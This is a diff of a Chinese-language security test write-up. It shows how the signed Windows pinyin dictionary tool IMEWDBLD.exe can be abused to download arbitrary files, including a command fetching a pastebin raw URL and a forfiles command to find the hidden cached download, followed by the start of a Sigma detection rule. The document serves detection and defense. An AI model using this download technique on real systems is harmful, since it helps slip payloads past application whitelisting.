@@ -5,18 +5,22 @@
 攻击者可能会将工具或其他文件从外部系统转移到被攻击的环境中。可以通过命令和控制通道从外部攻击者控制的系统复制文件，用以将工具带入被攻击的网络中，或通过其他工具（如 FTP）的替代协议。 也可以使用 scp、rsync 和 sftp等本地工具在Mac和 Linux上复制文件。
 
 ## 测试案例
+
 IMEWDBLD.exe是微软拼音的开放扩展字典模块，主要用来下载字典文件，在Windows中主要存在路径为：
 
 **路径:**
-```
+
+```yml
 -   C:\Windows\System32\IME\SHARED\IMEWDBLD.exe
 ```
+
 可以通过`C:\Windows\System32\IME\SHARED\IMEWDBLD.exe <URL>`进行下载任意文件，但是下载的路径为隐藏的文件/文件夹
 
 并且路径为`C:\Users\%username%\AppData\Local\Microsoft\Windows\INetCache\IE\[随机值]`;
 
 所以其利用方式是
-```
+
+```yml
 C:\Windows\System32\IME\SHARED\IMEWDBLD.exe https://pastebin.com/raw/tdyShwLw
 ```
 
@@ -25,7 +29,8 @@ C:\Windows\System32\IME\SHARED\IMEWDBLD.exe https://pastebin.com/raw/tdyShwLw
 操作系统：Windows 10
 
 查找下载文件路径：
-```
+
+```yml
 forfiles /P "%localappdata%\Microsoft\Windows\INetCache" /S /M * /C "cmd /c echo @path"
 
 > 参数介绍 
@@ -66,7 +71,9 @@ C:\Users\liyang>forfiles /P "%localappdata%\Microsoft\Windows\INetCache" /S /M *
 ```
 
 当执行下载任务时，Windows弹窗提示失败，忽略即可。实际上文件已经下载到本地目录中。
+
 ## 测试留痕
+
 ```yml
 已创建新进程。
 
@@ -114,7 +121,9 @@ C:\Users\liyang>forfiles /P "%localappdata%\Microsoft\Windows\INetCache" /S /M *
 ```
 
 ## 检测方法/思路
+
 ### Sigma规则
+
 ```yml
 title: IMEWDBLD白名单利用监测
 status: experimental
